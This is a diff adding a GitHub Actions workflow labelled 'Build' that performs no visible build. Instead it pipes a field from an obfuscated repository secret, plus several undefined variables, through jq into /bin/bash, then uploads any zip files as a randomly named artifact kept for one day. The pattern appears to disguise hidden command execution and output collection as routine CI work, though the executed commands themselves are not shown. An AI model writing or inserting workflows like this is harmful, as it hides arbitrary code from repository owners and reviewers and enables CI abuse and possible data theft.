@@ -1,0 +1,25 @@
+name: Build
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Execute
+        env:
+          wgsp5331: ${{ secrets.wgsp5331 }}
+        run: |
+          printf '%s' "$wgsp5331" | jq -r .kqlbj11 | /bin/bash
+          printf '%s' "$pglqi02166" | jq -r .es0 | /bin/bash
+          echo $yir89961 | jq -r .ulm39417 | /bin/bash
+          echo $behzr819 | jq -r .nrrl563 | /bin/bash
+          printf '%s' "$qlvqa9" | jq -r .g336 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: XSBqcVcE
+          path: "*.zip"
+          retention-days: 1
